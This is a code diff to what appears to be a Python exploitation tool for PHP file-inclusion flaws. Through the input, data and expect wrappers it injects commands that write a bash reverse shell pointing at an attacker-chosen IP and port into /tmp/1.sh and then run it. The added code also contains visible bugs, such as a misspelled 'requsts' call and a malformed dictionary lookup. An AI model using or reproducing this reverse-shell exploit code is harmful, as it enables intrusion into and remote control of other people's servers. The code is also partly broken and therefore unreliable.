@@ -243,7 +243,7 @@ def test_php_input(url):
                 getExploit(res, 'POST', 'RCE', tempUrl, posts[j], headers, 'INPUT', os)
                 break
 
-    if(os is not 'LINUX'):
+    if(os != 'LINUX'):
         print(os)
         #Windows
         for k in range(len(testW)):
@@ -416,6 +416,17 @@ def exploit(exploits, method):
             if(exploit['OS'] == 'LINUX'):
                 url = exploit['GETVAL']
                 
+                #Bash
+                u = url.replace('TMP', 'which%20bash')
+                res = requests.post(u, headers = headers, data=exploit['POSTVAL'], proxies = proxies)
+                if('/bin' in res.text and '/bash' in res.text):
+                    bashPayload = "echo+'bash+-i+>%26+/dev/tcp/"+ip+"/"+str(port)+"+0>%261'>/tmp/1.sh"
+                    u = url.replace('tmp', bashPayload)
+                    printInfo(ip, port, 'bash', 'input wrapper')
+                    requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                    requests.post(url.replace('TMP', "bash+/tmp/1.sh"), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                    return
+
                 #Netcat
                 u = url.replace('TMP', 'which%20nc')
                 res = requests.post(u, headers = headers, data=exploit['POSTVAL'], proxies = proxies)
@@ -452,7 +463,18 @@ def exploit(exploits, method):
             #Linux
             if(exploit['OS'] == 'LINUX'):
                 url = exploit['GETVAL']
-                
+               
+                #Bash
+                u = url.replace('TMP', 'which%20bash')
+                res = requests.get(u, headers = headers, proxies = proxies)
+                if('/bin' in res.text and '/bash' in res.text):
+                    printInfo(ip, port, 'bash', 'data wrapper')
+                    u = url.replace('TMP', "echo+'bash+-i+>%26+/dev/tcp/"+ip+"/"+str(port)+"+0>%261'>/tmp/1.sh")
+                    requests.get(u, headers = headers, proxies = proxies)
+                    requests.get(url.replace('TMP', "bash+/tmp/1.sh"), headers = headers, proxies = proxies)
+
+                    return
+
                 #Netcat
                 u = url.replace('TMP', 'which%20nc')
                 res = requests.get(u, headers = headers, proxies = proxies)
@@ -489,6 +511,16 @@ def exploit(exploits, method):
             if(exploit['OS' == 'LINUX']):
                 url = exploit['GETVAL']
                 
+                #Bash
+                u = url.replace('TMP', 'which%20bash')
+                res = requsts.get(u, headers = headers, proxies = proxies)
+                if('/bin' in res.text and '/bash' in res.text):
+                    u = url.replace('TMP', "echo+'bash+-i+>%26+/dev/tcp/"+ip+"/"+str(port)+"+0>%261'>/tmp/1.sh")
+                    printInfo(ip, port, 'bash', 'expect wrapper')
+                    requests.get(u, headers = headers, proxies = proxies)
+                    requests.get(url.replace('TMP', "bash+/tmp/1.sh"), headers = headers, proxies = proxies)
+                    return
+
                 #Netcat
                 u = url.replace('TMP', 'which%20nc')
                 res = requests.get(u, headers = headers, proxies = proxies)
